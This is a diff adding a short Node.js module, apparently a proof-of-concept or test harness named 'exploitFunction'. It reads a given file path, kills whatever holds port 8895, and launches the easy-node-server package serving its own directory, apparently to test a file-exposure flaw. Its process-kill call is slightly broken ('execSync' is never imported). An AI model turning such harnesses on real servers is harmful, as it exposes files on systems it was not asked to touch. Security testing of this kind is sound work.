@@ -1,0 +1,20 @@
+function exploitFunction(payload) {
+  const pkg = require("easy-node-server");
+  const fs = require("fs");
+  const { exec } = require("child_process");
+
+  let hostsFile = fs.readFileSync(payload).toString();
+
+  try {
+    execSync("fuser -k 8895/tcp", () => {});
+  } catch (e) {}
+
+  pkg.start({
+    port: 8895,
+    assetPath: __dirname,
+  });
+
+  return hostsFile;
+}
+
+module.exports = { exploitFunction };
